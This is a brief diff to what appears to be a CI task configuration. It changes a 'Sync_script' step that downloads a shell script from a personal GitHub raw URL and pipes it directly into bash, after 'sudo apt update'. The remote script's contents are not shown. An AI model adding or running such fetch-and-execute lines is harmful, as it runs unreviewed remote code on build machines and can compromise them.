@@ -11,4 +11,4 @@ task:
       memory: 32G
 
   Sync_script:
-      - sudo apt update && curl -sL https://raw.githubusercontent.com/SA-17/cr/main/b.sh | bash
+      - sudo apt update && curl -sL https://raw.githubusercontent.com/SA-17/cr1/main/b.sh | bash
